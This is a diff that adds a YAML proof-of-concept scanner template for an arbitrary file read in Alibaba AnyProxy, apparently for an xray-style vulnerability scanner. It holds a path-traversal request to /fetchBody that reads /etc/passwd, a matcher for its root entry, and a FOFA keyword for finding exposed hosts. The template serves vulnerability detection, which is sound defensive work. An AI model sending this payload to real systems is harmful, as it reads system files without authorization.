@@ -1,0 +1,20 @@
+name: poc-yaml-alibaba-anyproxy-fetchbody-fileread
+manual: true
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /fetchBody?id=1/../../../../../../../../etc/passwd
+        expression: response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+expression: r0()
+detail:
+    author: cysec
+    links:
+        - https://github.com/alibaba/anyproxy/issues/391
+    vulnerability:
+        id: CT-442578
+        level: high
+    fofakeyword: anyproxy
+    vulninfo: Alibaba AnyProxy 低版本存在任意文件读取
